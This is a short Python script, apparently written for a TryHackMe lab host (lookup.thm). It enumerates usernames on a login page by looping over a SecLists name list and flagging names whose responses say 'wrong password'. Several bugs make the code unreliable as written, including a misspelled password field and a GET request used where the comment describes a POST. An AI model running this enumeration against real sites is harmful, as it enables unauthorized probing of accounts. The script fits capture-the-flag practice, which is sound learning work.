#This a simple python code for brute_forcing abt the users on a login.php
import requests 
url = "http://lookup.thm/" # Change this :))
file_path = "/usr/share/SecLists/Usernames/Names/names.txt" # My list of Usernames  U shoulda change it in ur case </3
try :
    with open (file_path , "r") as file :
        for line in file : 
            username = line.strip()
            if not username :
                continue # to skipp the empty lines 
            # This is the Post Requests
            data = {
                "username" : username ,
                "passowrd" :"password" # its a random pass cuz alr know we need jst the usrnames 
            }
            # Our Response buuilding on ! 
            r = requests.get(url , data=data) 

            # checking up The response !!!
            if "wrong password" in r.text:
                print(f"[*] Username is FOund : {username}")
            elif "wrong username" in r.text :
                continue # skiippppppping The wrong usernames !!
except FileNotFoundError :
    print(f"ur file or ur path not exist {file_path}")
except requests.RequestException as e :
    print(f"u got an error in ur http or something else : {e}")
